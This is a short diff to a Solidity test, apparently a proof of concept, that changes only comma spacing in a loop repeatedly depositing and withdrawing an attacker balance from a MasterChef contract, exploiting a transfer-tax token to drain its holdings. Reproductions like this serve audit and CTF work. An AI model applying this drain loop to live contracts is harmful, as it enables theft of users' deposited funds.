@@ -77,14 +77,14 @@ contract InflationaryNetWorthTest is Test {
     uint256 masterChefBalance;
 
     while (true) {
-        masterChef.deposit(0,attackerBalance);
+        masterChef.deposit(0, attackerBalance);
         masterChefBalance = mula.balanceOf(address(masterChef))-1;
 
         if (masterChefBalance < attackerBalance) {
-            masterChef.withdraw(0,masterChefBalance);
+            masterChef.withdraw(0, masterChefBalance);
             break;
         } else {
-            masterChef.withdraw(0,attackerBalance);
+            masterChef.withdraw(0, attackerBalance);
         }
 
         attackerBalance = attackerBalance * 95 / 100; // post transfer tax
